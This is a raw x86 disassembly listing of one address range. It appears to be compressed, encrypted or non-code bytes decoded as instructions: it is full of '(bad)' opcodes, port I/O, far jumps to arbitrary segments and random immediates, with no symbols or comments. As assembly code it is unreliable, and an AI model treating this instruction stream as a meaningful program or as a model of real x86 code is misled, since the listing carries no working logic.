  41b30d:	leave  
  41b30e:	in     eax,dx
  41b30f:	pop    ss
  41b310:	add    eax,0x34b5411d
  41b315:	call   FWORD PTR [esi+0x51]
  41b318:	sub    DWORD PTR [esi+0x7e],0xc4264561
  41b31f:	add    al,0x85
  41b321:	xchg   edi,eax
  41b322:	jmp    0x92d6:0x493522b2
  41b329:	jbe    0x41b2e0
  41b32b:	js     0x41b357
  41b32d:	sub    ecx,DWORD PTR [ebp-0xcf0ffa2]
  41b333:	sbb    DWORD PTR [edi+0x8],ebp
  41b336:	fld    TBYTE PTR [eax+0x42ce9a0a]
  41b33c:	js     0x41b328
  41b33e:	cld    
  41b33f:	xchg   BYTE PTR [ebp-0x4b],bh
  41b342:	jnp    0x41b3c0
  41b344:	jmp    0x92c63e51
  41b349:	push   ecx
  41b34a:	pop    ds
  41b34b:	jmp    0x41b2d0
  41b34d:	test   al,0x59
  41b34f:	je     0x41b3c6
  41b351:	les    ebp,FWORD PTR [esi+0x593e670a]
  41b357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b358:	push   eax
  41b359:	adc    bl,dh
  41b35b:	in     eax,0x92
  41b35d:	adc    dh,ah
  41b35f:	sbb    eax,esi
  41b361:	(bad)  
  41b362:	imul   ecx,DWORD PTR [ebx-0x536678c9],0xffffff99
  41b369:	push   ds
  41b36a:	jb     0x41b39c
  41b36c:	mov    BYTE PTR [edx],bh
  41b36e:	outs   dx,DWORD PTR ds:[esi]
  41b36f:	and    al,BYTE PTR [ebp+0x3d]
  41b372:	mov    ebx,0xbaca852
  41b377:	and    eax,0x8f3505b7
  41b37c:	ror    BYTE PTR [eax+0x7c],1
  41b37f:	mov    al,0x85
  41b381:	sub    BYTE PTR [ebx],0x9d
  41b384:	dec    eax
  41b385:	rol    BYTE PTR [ebx-0x60a2e572],cl
  41b38b:	or     eax,0xfa7afcd7
  41b390:	push   0x93de48fc
  41b395:	out    0xb2,eax
  41b397:	mov    esp,0xb784164b
  41b39c:	inc    ebx
  41b39d:	cli    
  41b39e:	rcr    BYTE PTR [eax+0x11],1
  41b3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3a2:	shl    DWORD PTR [esi-0x4b],0x58
  41b3a6:	test   al,0xeb
  41b3a8:	out    dx,eax
  41b3a9:	ret    0x893
  41b3ac:	mov    ?,WORD PTR [ebp-0x71ab87c]
  41b3b2:	fcmovu st,st(4)
  41b3b4:	(bad)  
  41b3b5:	add    BYTE PTR es:[eax+0x5bf4bc33],ch
  41b3bc:	mov    ch,0x5c
  41b3be:	sub    eax,0x8fef7908
  41b3c3:	std    
  41b3c4:	ud0    esp,DWORD PTR [ebx-0x35]
  41b3c8:	out    0x1f,eax
  41b3ca:	or     DWORD PTR [edi],edi
  41b3cc:	mov    edi,0x125dca57
  41b3d1:	outs   dx,BYTE PTR ds:[esi]
  41b3d2:	sub    ebx,ebp
  41b3d4:	jns    0x41b37f
  41b3d6:	xchg   ebx,eax
  41b3d7:	push   es
  41b3d8:	jno    0x41b451
  41b3da:	popa   
  41b3db:	stos   BYTE PTR es:[edi],al
  41b3dc:	dec    ebx
  41b3dd:	xchg   edx,eax
  41b3de:	jmp    0xe33ea622
  41b3e3:	add    eax,0xe44c5283
  41b3e8:	pop    edi
  41b3e9:	mov    dh,0xe
  41b3eb:	adc    bl,al
  41b3ed:	xchg   edi,eax
  41b3ee:	cmp    ebp,DWORD PTR [eax]
  41b3f0:	pop    edx
  41b3f1:	sbb    dl,BYTE PTR [esi+0x70]
  41b3f4:	mov    bl,0x71
  41b3f6:	fisttp DWORD PTR [edx-0x19]
  41b3f9:	sti    
  41b3fa:	or     bh,0x57
  41b3fd:	sub    BYTE PTR ds:0x958c12c6,al
  41b403:	pop    ebx
  41b404:	popa   
  41b405:	and    al,0x4d
  41b407:	adc    DWORD PTR [edi],eax
  41b409:	in     al,dx
  41b40a:	mov    edx,0x87c9445
  41b40f:	outs   dx,DWORD PTR ds:[esi]
  41b410:	daa    
  41b411:	fcomp  DWORD PTR [edx]
  41b413:	retf   0x498e
  41b416:	mov    eax,es
  41b418:	call   0xb31fca43
  41b41d:	mov    edi,0x289abaaf
  41b422:	pop    esp
  41b423:	(bad)
  41b427:	ins    BYTE PTR es:[edi],dx
  41b428:	add    al,0x84
  41b42a:	mov    ecx,0xa03e6060
  41b42f:	mov    eax,0xf0f6c98b
  41b434:	popa   
  41b435:	pusha  
  41b436:	cmp    al,0x1b
  41b438:	lods   eax,DWORD PTR ds:[esi]
  41b439:	dec    ebp
  41b43a:	xor    bl,BYTE PTR [ecx-0x34]
  41b43d:	and    edi,ebp
  41b43f:	sub    eax,0xe9c25813
  41b444:	push   ecx
  41b445:	or     DWORD PTR [esi],ebp
  41b447:	dec    esp
  41b448:	gs ss push edi
  41b44b:	fcmovnb st,st(1)
  41b44d:	inc    edi
  41b44e:	push   ss
  41b44f:	adc    eax,edi
  41b451:	jg     0x41b40b
  41b453:	dec    ebx
  41b454:	outs   dx,DWORD PTR ds:[esi]
  41b455:	add    BYTE PTR [ebx],ch
  41b457:	out    0x4,al
  41b459:	and    al,0xd6
  41b45b:	mov    eax,es:0xda6c45b
  41b461:	out    dx,eax
  41b462:	push   edi
  41b463:	and    bl,BYTE PTR [edi-0x13]
  41b466:	je     0x41b4be
  41b468:	out    dx,al
  41b469:	add    al,0x63
  41b46b:	mov    ds:0x863c3baa,al
  41b470:	or     BYTE PTR [edx+0x5c],cl
  41b473:	and    bh,0xe5
  41b476:	rol    DWORD PTR [ecx+0x5acc1da6],1
  41b47c:	dec    edi
  41b47d:	adc    edx,DWORD PTR [ecx+0x684e3be9]
  41b483:	neg    DWORD PTR [eax+0x15078ead]
  41b489:	sub    eax,0x3420585b
  41b48e:	cmc    
  41b48f:	dec    ebp
  41b490:	shl    BYTE PTR [eax+0x5a],0xd0
  41b494:	out    0xcd,eax
  41b496:	shl    DWORD PTR [ebp-0x7b],0x2a
  41b49a:	fst    DWORD PTR [ecx+0x21]
  41b49d:	imul   ebp,DWORD PTR [ebx-0x2a95c5eb],0x2e31da12
  41b4a7:	(bad)  
  41b4a8:	xchg   ecx,eax
  41b4a9:	fadd   DWORD PTR [esi-0x9337e07]
  41b4af:	out    0x34,eax
  41b4b1:	(bad)  
  41b4b2:	adc    BYTE PTR [eax-0x719727ed],bl
  41b4b8:	leave  
  41b4b9:	xchg   edx,eax
  41b4ba:	fdiv   QWORD PTR [edi-0x15]
  41b4bd:	cli    
  41b4be:	inc    ebx
  41b4bf:	push   edx
  41b4c0:	or     ebp,ebx
  41b4c2:	xchg   ecx,eax
  41b4c3:	cmp    DWORD PTR [edx+0x41],ebx
  41b4c6:	sub    DWORD PTR [edi+ebp*4],0xffffffaf
  41b4ca:	dec    edx
  41b4cb:	shr    BYTE PTR [edi-0x61378833],1
  41b4d1:	(bad)  
  41b4d2:	jge    0x41b477
  41b4d4:	mov    ecx,0xe5efb59
  41b4d9:	mov    fs,edx
  41b4db:	and    ebx,DWORD PTR [edi-0x2d]
  41b4de:	xchg   bp,ax
  41b4e0:	out    dx,eax
  41b4e1:	pop    esi
  41b4e2:	jns    0x41b4ad
  41b4e4:	nop
  41b4e5:	fidiv  WORD PTR [ecx+ebx*2+0xfed9752]
  41b4ec:	and    DWORD PTR [edi+0x1c],esp
  41b4ef:	push   ds
  41b4f0:	out    0x3,eax
  41b4f2:	jle    0x41b4df
  41b4f4:	pop    eax
  41b4f5:	cld    
  41b4f6:	mov    edx,ebp
  41b4f8:	dec    edx
  41b4f9:	into   
  41b4fa:	loope  0x41b54e
  41b4fc:	push   cs
  41b4fd:	dec    ebp
  41b4fe:	add    BYTE PTR [esi+ebp*8],dh
  41b501:	pop    edi
  41b502:	xchg   esi,eax
  41b503:	sbb    BYTE PTR [esp+eax*8-0x25],bh
  41b507:	stc    
  41b508:	(bad)  [edx+0x25f6efd0]
  41b50e:	cmp    BYTE PTR gs:[ebx+0x65],dl
  41b512:	stc    
  41b513:	inc    ebp
  41b514:	js     0x41b55b
  41b516:	and    BYTE PTR [ebx],0xc4
  41b519:	push   eax
  41b51a:	cmp    ebp,DWORD PTR [esi+esi*8]
  41b51d:	push   ebx
  41b51e:	jg     0x41b4cf
  41b520:	inc    eax
  41b521:	cwde   
  41b522:	pushf  
  41b523:	cmp    cx,WORD PTR [ecx-0x20]
  41b527:	std    
  41b528:	mov    edx,0xb58180d
  41b52d:	lea    edi,[ebx-0x3bf1be80]
  41b533:	xor    eax,0x3c7d77d
  41b538:	mov    cl,0x1c
  41b53a:	lods   al,BYTE PTR ds:[esi]
  41b53b:	cmp    edx,DWORD PTR [esi+ebp*2]
  41b53e:	lahf   
  41b53f:	xchg   ebp,eax
  41b540:	sbb    al,0xac
  41b542:	call   0x3dcee47
  41b547:	jbe    0x41b5c0
  41b549:	push   edx
  41b54a:	mov    DWORD PTR [ecx],ebx
  41b54c:	scas   eax,DWORD PTR es:[edi]
  41b54d:	pop    es
  41b54e:	outs   dx,DWORD PTR ds:[esi]
  41b54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b550:	jg     0x41b517
  41b552:	jne    0x41b5a6
  41b554:	shl    BYTE PTR ds:0x944e211,1
  41b55a:	push   esp
  41b55b:	jmp    0xa453:0x3e36291c
  41b562:	pop    ebx
  41b563:	cmp    eax,0x2ac9b5aa
  41b568:	scas   al,BYTE PTR es:[edi]
  41b569:	jns    0x41b5cf
  41b56b:	adc    edi,DWORD PTR [eax-0x23aa3800]
  41b571:	jp     0x41b5ee
  41b573:	pushf  
  41b574:	xor    cl,BYTE PTR [ebx]
  41b576:	icebp  
  41b577:	xor    al,BYTE PTR [edi+0x4b]
  41b57a:	dec    esp
  41b57b:	ss ret 
  41b57d:	or     al,0xe
  41b57f:	add    eax,0x8b93163
  41b584:	out    dx,eax
  41b585:	ins    BYTE PTR es:[edi],dx
  41b586:	(bad)  
  41b588:	mov    ebx,0xfda49faf
  41b58d:	xchg   edi,eax
  41b58e:	sbb    eax,0xf149d66f
  41b593:	push   edi
  41b594:	popf   
  41b595:	test   al,0xb4
  41b597:	mov    ebx,0x9123e3a6
  41b59c:	sbb    edi,DWORD PTR [edi]
  41b59e:	out    dx,al
  41b59f:	retf   0x6e9c
  41b5a2:	cmp    al,0x20
  41b5a4:	push   cs
  41b5a5:	adc    al,0x3d
  41b5a7:	jbe    0x41b556
  41b5a9:	jae    0x41b625
  41b5ab:	fcom   QWORD PTR [bx+di-0x43]
  41b5af:	and    eax,0xd9a0e2e8
  41b5b4:	or     bl,BYTE PTR [esi-0x730e2cd8]
  41b5ba:	jl     0x41b5e4
  41b5bc:	mov    dl,dh
  41b5be:	fisttp WORD PTR [edx+0x66]
  41b5c1:	cmp    BYTE PTR [ebx],dl
  41b5c3:	clc    
  41b5c4:	mov    bh,0x8d
  41b5c6:	sub    eax,0xb78b2ca1
  41b5cb:	push   ss
  41b5cc:	mov    dl,0xa7
  41b5ce:	pop    esi
  41b5cf:	jg     0x41b59d
  41b5d1:	test   DWORD PTR ds:0x2283c783,edx
  41b5d7:	and    ch,cl
  41b5d9:	and    al,0x2b
  41b5db:	(bad)  
  41b5dc:	push   esi
  41b5dd:	mov    edx,0xd6e86da2
  41b5e2:	inc    ecx
  41b5e3:	mov    al,0x5d
  41b5e5:	xor    eax,0xb2b0bc3e
  41b5ea:	and    eax,0xa7acbb61
  41b5ef:	fistp  WORD PTR [ebx]
  41b5f1:	pop    esi
  41b5f2:	ret    
  41b5f3:	out    0xba,al
  41b5f5:	in     al,0x66
  41b5f7:	jb     0x41b591
  41b5f9:	scas   al,BYTE PTR es:[edi]
  41b5fa:	test   eax,0xeaa28d78
  41b5ff:	retf   0xd883
  41b602:	mov    ecx,0x604884d8
  41b607:	or     al,0xbf
  41b609:	jl     0x41b5de
  41b60b:	push   esp
  41b60c:	cli    
  41b60d:	fmulp  st(4),st
  41b60f:	into   
  41b610:	mov    cl,0x54
  41b612:	(bad)  
  41b613:	jp     0x41b5f9
  41b615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b616:	sbb    BYTE PTR gs:[esi-0x41],cl
  41b61a:	out    dx,eax
  41b61b:	inc    ecx
  41b61c:	sti    
  41b61d:	popa   
  41b61e:	std    
  41b61f:	jle    0x41b673
  41b621:	inc    DWORD PTR [esi]
  41b623:	sbb    dh,BYTE PTR [ecx+edi*4]
  41b626:	out    dx,eax
  41b627:	int3   
  41b628:	pop    esp
  41b629:	mov    edi,DWORD PTR [ecx+eiz*8]
  41b62c:	call   0xca9a:0xa80d69a3
  41b633:	dec    ebp
  41b634:	into   
  41b635:	lahf   
  41b636:	ins    BYTE PTR es:[edi],dx
  41b637:	adc    eax,DWORD PTR [esi+0x30a1cdf7]
  41b63d:	cmc    
  41b63e:	scas   eax,DWORD PTR es:[edi]
  41b63f:	push   ebx
  41b640:	xchg   eax,ecx
  41b642:	pop    ds
  41b643:	mov    WORD PTR [eax+0x2e],ss
  41b646:	int3   
  41b647:	push   esp
  41b648:	loop   0x41b604
  41b64a:	jnp    0x41b61c
  41b64c:	xchg   esi,eax
  41b64d:	mov    ah,BYTE PTR [ecx]
  41b64f:	sub    eax,0xea634630
  41b654:	pop    edi
  41b655:	enter  0xbd71,0x3b
  41b659:	shrd   DWORD PTR [edi-0x50],edx,0x44
  41b65e:	xor    BYTE PTR [ebp-0x50],0x64
  41b662:	mov    eax,ds:0x3bae2c3
  41b667:	fist   WORD PTR ds:0xeee1fee7
  41b66d:	cdq    
  41b66e:	pop    edi
  41b66f:	jp     0x41b62b
  41b671:	and    ecx,DWORD PTR [ecx-0x4a]
  41b674:	mov    WORD PTR [edx],?
  41b676:	popf   
  41b677:	sub    esi,DWORD PTR [ebp+0x77a84166]
  41b67d:	enter  0x6115,0x8c
  41b681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b682:	outs   dx,BYTE PTR ds:[esi]
  41b683:	leave  
  41b684:	ror    ecx,cl
  41b686:	nop    ecx
  41b689:	and    eax,0x2577f571
  41b68e:	rol    DWORD PTR [ebx+0x30],cl
  41b691:	leave  
  41b692:	jb     0x41b6a8
  41b694:	mov    bh,0xba
  41b696:	test   al,0x2e
  41b698:	pop    es
  41b699:	sahf   
  41b69a:	add    BYTE PTR [ebp-0xc],dl
  41b69d:	outs   dx,BYTE PTR ds:[esi]
  41b69f:	fadd   QWORD PTR [edx]
  41b6a1:	pop    ebx
  41b6a2:	or     ebx,eax
  41b6a4:	and    al,0x87
  41b6a6:	test   BYTE PTR [ecx],0x96
  41b6a9:	ds repz or ecx,ebp
  41b6ad:	jg     0x41b681
  41b6af:	inc    esp
  41b6b0:	push   ebx
  41b6b1:	jge    0x41b63f
  41b6b3:	ins    DWORD PTR es:[edi],dx
  41b6b4:	and    ecx,DWORD PTR [ebp-0x5a]
  41b6b7:	dec    ecx
  41b6b8:	scas   al,BYTE PTR es:[edi]
  41b6b9:	adc    BYTE PTR [edi+0x1e207ade],0xbd
  41b6c0:	mov    dl,0x6a
  41b6c2:	lahf   
  41b6c3:	jg     0x41b719
  41b6c5:	add    al,0x91
  41b6c7:	popa   
  41b6c8:	pop    ebx
  41b6c9:	test   al,0x16
  41b6cb:	bound  cx,DWORD PTR [esi-0xbd1cc5d]
  41b6d2:	mov    ds:0x46fb9327,eax
  41b6d7:	retf   0xdeb1
  41b6da:	cs nop
  41b6dc:	inc    ebp
  41b6dd:	pop    ebx
  41b6de:	cdq    
  41b6df:	dec    esp
  41b6e0:	push   esi
  41b6e1:	mov    ds:0xd3859894,eax
  41b6e6:	rcr    bh,0xc4
  41b6e9:	sbb    al,0xbb
  41b6eb:	add    eax,0x18b7cff6
  41b6f0:	loop   0x41b6f8
  41b6f2:	fistp  DWORD PTR [ebx+0x343a3e69]
  41b6f8:	add    DWORD PTR [ebx],esp
  41b6fa:	cmp    ebp,DWORD PTR [esi+0x574f92da]
  41b700:	xchg   ecx,eax
  41b701:	cld    
  41b702:	daa    
  41b703:	sbb    BYTE PTR [ebp-0x38],ah
  41b706:	xchg   DWORD PTR [edi+eiz*1-0x22],edx
  41b70a:	push   ds
  41b70b:	sbb    eax,0xc58da0cd
  41b710:	std    
  41b711:	stos   BYTE PTR es:[edi],al
  41b712:	push   edx
  41b713:	leave  
  41b714:	popa   
  41b715:	leave  
  41b716:	sub    DWORD PTR [eax],edi
  41b718:	or     al,0xb3
  41b71a:	popf   
  41b71b:	mov    fs,WORD PTR [edi+ebp*1]
  41b71e:	jns    0x41b769
  41b720:	inc    ebx
  41b721:	daa    
  41b722:	xor    al,0x34
  41b724:	sub    bl,al
  41b726:	int3   
  41b727:	aam    0xe7
  41b729:	in     al,dx
  41b72a:	aas    
  41b72b:	xor    BYTE PTR [esi],ah
  41b72d:	call   0x3c1062d1
  41b732:	(bad)  
  41b733:	jae    0x41b736
  41b735:	je     0x41b717
  41b737:	shl    DWORD PTR [ebx],cl
  41b739:	xor    eax,0xbf2046f4
  41b73e:	scas   al,BYTE PTR es:[edi]
  41b73f:	jecxz  0x41b706
  41b741:	and    eax,DWORD PTR [edx]
  41b743:	push   ebp
  41b744:	dec    ebx
  41b745:	xor    BYTE PTR [ecx],bl
  41b747:	add    ch,BYTE PTR [ecx]
  41b749:	js     0x41b6f5
  41b74b:	sbb    al,0xcc
  41b74d:	clc    
  41b74e:	dec    esp
  41b74f:	in     eax,0xd9
  41b751:	out    0x7a,eax
  41b753:	jge    0x41b74a
  41b755:	pop    ebx
  41b756:	cld    
  41b757:	mov    ebp,0xe0500899
  41b75c:	jns    0x41b792
  41b75e:	lahf   
  41b75f:	ss iret 
  41b761:	xchg   BYTE PTR [ecx-0x1882d0aa],bl
  41b767:	and    al,0xb4
  41b769:	jp     0x41b70e
  41b76b:	cmc    
  41b76c:	mov    ebp,0xf3343a92
  41b771:	add    ebp,DWORD PTR [edx]
  41b773:	std    
  41b774:	loopne 0x41b743
  41b776:	cdq    
  41b777:	xchg   edi,eax
  41b778:	jb     0x41b715
  41b77a:	arpl   WORD PTR [ecx-0x3c],bp
  41b77d:	hlt    
  41b77e:	in     al,0xdd
  41b780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b781:	sub    eax,0xc344e4c3
  41b786:	fimul  DWORD PTR [ebx+0x3d509f86]
  41b78c:	addr16 sub al,0x24
  41b78f:	rol    cl,1
  41b791:	out    dx,al
  41b792:	out    0x90,eax
  41b794:	pop    ss
  41b795:	push   edx
  41b796:	inc    ebx
  41b797:	popf   
  41b798:	xor    DWORD PTR [eax+0x3c],esp
  41b79b:	push   edx
  41b79c:	clc    
  41b79d:	jbe    0x41b76e
  41b79f:	jecxz  0x41b772
  41b7a1:	lods   eax,DWORD PTR ds:[esi]
  41b7a2:	mov    esp,0xf5f55fc1
  41b7a7:	jmp    0x141c46e3
  41b7ac:	shr    DWORD PTR [esi-0x21],cl
  41b7af:	jmp    0xb14d84c
  41b7b4:	scas   al,BYTE PTR es:[edi]
  41b7b5:	xchg   ebx,eax
  41b7b6:	xor    eax,0xb3de7156
  41b7bb:	sbb    BYTE PTR [esi],bh
  41b7bd:	mov    ebp,0x87a2c00b
  41b7c2:	push   ss
  41b7c3:	jmp    0xc03cab59
  41b7c8:	outs   dx,DWORD PTR ds:[esi]
  41b7c9:	or     al,0xbe
  41b7cb:	sar    esp,0x8e
  41b7ce:	test   BYTE PTR [edx],0x9e
  41b7d1:	hlt    
  41b7d2:	rcl    esp,cl
  41b7d4:	xor    cl,al
  41b7d6:	outs   dx,BYTE PTR ds:[esi]
  41b7d7:	test   BYTE PTR [edx+0x24],dh
  41b7da:	xor    edx,DWORD PTR [esi-0x11aeab04]
  41b7e0:	inc    esi
  41b7e1:	das    
  41b7e2:	sbb    ch,BYTE PTR [edx]
  41b7e4:	cdq    
  41b7e5:	mov    bl,0xa8
  41b7e7:	int    0xb2
  41b7e9:	daa    
  41b7ea:	dec    eax
  41b7eb:	loope  0x41b800
  41b7ed:	mov    edi,0x6156e6f4
  41b7f2:	mov    cl,0x23
  41b7f4:	jbe    0x41b7f8
  41b7f6:	test   al,bl
  41b7f8:	inc    esp
  41b7f9:	ins    DWORD PTR es:[edi],dx
  41b7fa:	mov    ecx,0x34cc5d78
  41b7ff:	dec    edi
  41b800:	pop    edi
  41b801:	xchg   DWORD PTR [esi-0x69],esp
  41b804:	outs   dx,DWORD PTR ds:[esi]
  41b805:	add    ch,ch
  41b807:	pop    esp
  41b808:	in     eax,dx
  41b809:	data16 jnp 0x41b82d
  41b80c:	pop    es
  41b80d:	sbb    eax,esp
  41b80f:	retf   0xfa29
  41b812:	jo     0x41b79c
  41b814:	gs inc ebx
  41b816:	arpl   WORD PTR [esi],cx
  41b818:	and    bh,BYTE PTR [ebx+0x44]
  41b81b:	cwde   
  41b81c:	sbb    al,0x69
  41b81e:	mov    cl,0xa7
  41b820:	cmp    eax,0x34a95a01
  41b825:	fiadd  WORD PTR [edi+edx*1]
  41b828:	mov    esi,0xe2592efb
  41b82d:	leave  
  41b82e:	and    eax,0x29cf4da2
  41b833:	xor    bh,bl
  41b835:	pop    ds
  41b836:	rcr    BYTE PTR [ecx-0x2c],1
  41b839:	(bad)  
  41b83a:	div    BYTE PTR [ecx-0x5c21cd65]
  41b840:	les    eax,FWORD PTR [esi]
  41b842:	adc    eax,0x9f53ce32
  41b847:	and    bh,BYTE PTR [eax]
  41b849:	in     al,dx
  41b84a:	pop    ebx
  41b84b:	fisubr DWORD PTR [esi]
  41b84d:	repnz test eax,0xc819d038
  41b853:	test   BYTE PTR fs:[edx+0x44250d2b],bl
  41b85a:	shl    DWORD PTR [ebp-0x6c40e8ba],1
  41b860:	repz or DWORD PTR [ecx+0x57511377],0x4d7b5b56
  41b86b:	push   ss
  41b86c:	int    0x76
  41b86e:	stos   DWORD PTR es:[edi],eax
  41b86f:	or     eax,0x5856760d
  41b874:	call   0xf03dce3e
  41b879:	mov    ds:0x86519dc1,al
  41b87e:	jae    0x41b895
  41b880:	xchg   ebx,eax
  41b881:	mov    eax,ds:0xdd4b4be6
  41b886:	mov    al,ds:0x665adff6
  41b88b:	xchg   esi,eax
  41b88c:	push   eax
  41b88d:	enter  0xd1db,0xc4
  41b891:	js     0x41b858
  41b893:	shl    BYTE PTR [ebx],0xa1
  41b896:	fs jno 0x41b8d8
  41b899:	inc    ebp
  41b89a:	sub    al,0x62
  41b89c:	jnp    0x41b8ed
  41b89e:	outs   dx,DWORD PTR ds:[esi]
  41b89f:	out    dx,al
  41b8a0:	sahf   
  41b8a1:	repz or ah,BYTE PTR [edx+0x7416599c]
  41b8a8:	mov    ch,0xc0
  41b8aa:	in     eax,0x36
  41b8ac:	inc    esp
  41b8ad:	jle    0x41b87e
  41b8af:	mov    cl,0xce
  41b8b1:	mov    ebp,ebp
  41b8b3:	dec    edi
  41b8b4:	hlt    
  41b8b5:	test   eax,0xd957104d
  41b8ba:	pop    ebp
  41b8bb:	mov    eax,0xab37750c
  41b8c0:	hlt    
  41b8c1:	pop    es
  41b8c2:	repnz lock retf 0x79dd
  41b8c7:	mov    edi,0xdc487db4
  41b8cc:	xor    eax,0xc7050e1e
  41b8d1:	dec    eax
  41b8d2:	retf   0xf0a8
  41b8d5:	loope  0x41b8e8
  41b8d7:	jle    0x41b94c
  41b8d9:	pop    edi
  41b8da:	out    0xdf,al
  41b8dc:	daa    
  41b8dd:	shl    DWORD PTR [edi+0x3b40631a],1
  41b8e3:	cmc    
  41b8e4:	int    0xae
  41b8e6:	pop    es
  41b8e7:	xchg   ebx,eax
  41b8e8:	adc    eax,0x74f62497
  41b8ed:	arpl   ax,di
  41b8ef:	or     BYTE PTR [ebp-0x21],dl
  41b8f2:	(bad)  
  41b8f3:	mov    esp,0xa87465eb
  41b8f8:	(bad)  
  41b8f9:	jnp    0x41b89c
  41b8fb:	aaa    
  41b8fc:	sub    BYTE PTR [edx+edi*2],cl
  41b8ff:	jle    0x41b897
  41b901:	(bad)  
  41b902:	jp     0x41b89f
  41b904:	mov    ebx,0x24751d42
  41b909:	cmc    
  41b90a:	push   0x1acb36c4
  41b90f:	inc    eax
  41b910:	mov    bh,0xcc
  41b912:	fld    TBYTE PTR [ecx]
  41b914:	test   BYTE PTR [esi],dl
  41b916:	adc    ecx,eax
  41b918:	lea    edi,[edi+ebp*1-0x97f8097]
  41b91f:	fcom   st(7)
  41b921:	pop    esi
  41b922:	les    esi,FWORD PTR [ebx+0x74]
  41b925:	jp     0x41b96c
  41b927:	push   edx
  41b928:	mov    cl,0xcb
  41b92a:	push   ss
  41b92b:	jb     0x41b940
  41b92d:	jnp    0x41b979
  41b92f:	push   ss
  41b930:	dec    edi
  41b931:	inc    esi
  41b932:	jmp    0x41b930
  41b934:	jne    0x41b92b
  41b936:	xor    eax,0xe24cb763
  41b93b:	mov    al,0xd8
  41b93d:	jae    0x41b965
  41b93f:	pushf  
  41b940:	jmp    0xdfb0be22
  41b945:	pop    eax
  41b946:	(bad)  
  41b947:	cs loop 0x41b95e
  41b94a:	add    DWORD PTR [esi+ebp*1],edi
  41b94d:	inc    eax
  41b94e:	jo     0x41b8e2
  41b950:	xchg   esp,eax
  41b951:	retf   0x6eb9
  41b954:	mov    BYTE PTR [edi-0x5f],ch
  41b957:	push   ecx
  41b958:	jae    0x41b96c
  41b95a:	cld    
  41b95b:	xor    bh,cl
  41b95d:	jmp    0x41b970
  41b95f:	mov    cl,0xc7
  41b961:	add    DWORD PTR [ebx-0x20],ebp
  41b964:	sub    DWORD PTR [esi+0x30ba6539],ebp
  41b96a:	shl    DWORD PTR ds:0xcfca8e34,cl
  41b970:	and    BYTE PTR [ecx+0xf],cl
  41b973:	mov    dh,0x9b
  41b975:	jae    0x41b9bc
  41b977:	adc    DWORD PTR [ecx+0x4d967ad6],edi
  41b97d:	pop    es
  41b97e:	sbb    bh,bh
  41b980:	(bad)  
  41b981:	and    esp,DWORD PTR [eax+0x18]
  41b984:	daa    
  41b985:	retf   0xb74e
  41b988:	dec    esi
  41b989:	mov    ds:0x630dbf7f,al
  41b98e:	enter  0x4ddc,0xe3
  41b992:	shl    DWORD PTR [esi-0x7a],1
  41b995:	sti    
  41b996:	pop    ecx
  41b997:	add    DWORD PTR [ebx+0x4a0c00dd],esi
  41b99d:	stos   BYTE PTR es:[edi],al
  41b99e:	aaa    
  41b99f:	mov    esi,esi
  41b9a1:	add    BYTE PTR [ecx],cl
  41b9a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9a4:	jle    0x41b944
  41b9a6:	sbb    al,0x8
  41b9a8:	repnz into 
  41b9aa:	mov    al,BYTE PTR [ebx]
  41b9ac:	inc    ebp
  41b9ad:	(bad)  
  41b9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9b0:	(bad)  
  41b9b1:	sub    ebp,eax
  41b9b3:	ins    DWORD PTR es:[edi],dx
  41b9b4:	pop    edx
  41b9b5:	js     0x41b96e
  41b9b7:	ss dec ebp
  41b9b9:	jle    0x41b9e2
  41b9bb:	jl     0x41ba35
  41b9bd:	lods   eax,DWORD PTR ds:[esi]
  41b9be:	inc    ebx
  41b9bf:	into   
  41b9c0:	(bad)
  41b9c4:	sbb    BYTE PTR [edi],dh
  41b9c6:	and    al,0x75
  41b9c8:	or     eax,esp
  41b9ca:	and    BYTE PTR [eax+edx*8-0x5b],al
  41b9ce:	mov    eax,ds:0xbe3403d9
  41b9d3:	mov    BYTE PTR [esi],ch
  41b9d5:	sbb    al,0x20
  41b9d7:	sub    DWORD PTR [ecx],esi
  41b9d9:	push   ebp
  41b9da:	fmul   st,st(2)
  41b9dc:	cmp    al,0x90
  41b9de:	add    ch,BYTE PTR [edx]
  41b9e0:	xchg   ecx,eax
  41b9e1:	adc    al,0x62
  41b9e3:	jbe    0x41b9c1
  41b9e5:	scas   al,BYTE PTR es:[edi]
  41b9e6:	jl     0x41b9d1
  41b9e8:	(bad)  
  41b9e9:	nop
  41b9ea:	out    0x6c,al
  41b9ec:	push   edi
  41b9ed:	adc    ch,BYTE PTR [ebx]
  41b9ef:	popf   
  41b9f0:	lahf   
  41b9f1:	inc    edx
  41b9f2:	(bad)  
  41b9f3:	out    0xf5,al
  41b9f5:	ins    BYTE PTR es:[edi],dx
  41b9f6:	fs test eax,0x92eb4e70
  41b9fc:	jo     0x41b9f4
  41b9fe:	sar    DWORD PTR [ecx+0x8ebc34c],1
  41ba04:	rcr    DWORD PTR [edx-0x1e],1
  41ba07:	cmp    dh,cl
  41ba09:	mov    dh,0x89
  41ba0b:	jns    0x41b9db
  41ba0d:	cdq    
  41ba0e:	or     DWORD PTR [esi-0x25],ebx
  41ba11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba12:	push   0xfffffff7
  41ba14:	adc    eax,0xdb0e845b
  41ba19:	ja     0x41ba2b
  41ba1b:	ret    0x22a2
  41ba1e:	stos   BYTE PTR es:[edi],al
  41ba1f:	inc    edi
  41ba20:	sar    eax,1
  41ba22:	(bad)  
  41ba23:	fist   WORD PTR [edx-0x78]
  41ba26:	jle    0x41b9dd
  41ba28:	in     eax,dx
  41ba29:	stos   DWORD PTR es:[edi],eax
  41ba2a:	popf   
  41ba2b:	outs   dx,BYTE PTR ds:[esi]
  41ba2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba2d:	sbb    eax,0x87617c16
  41ba32:	mov    ebx,0xac367f90
  41ba37:	addr16 cmp bx,di
  41ba3b:	clc    
  41ba3c:	dec    ecx
  41ba3d:	adc    DWORD PTR [ecx+0x15],eax
  41ba40:	enter  0x114f,0x70
  41ba44:	jge    0x41ba3a
  41ba46:	inc    eax
  41ba47:	mov    cl,0x3
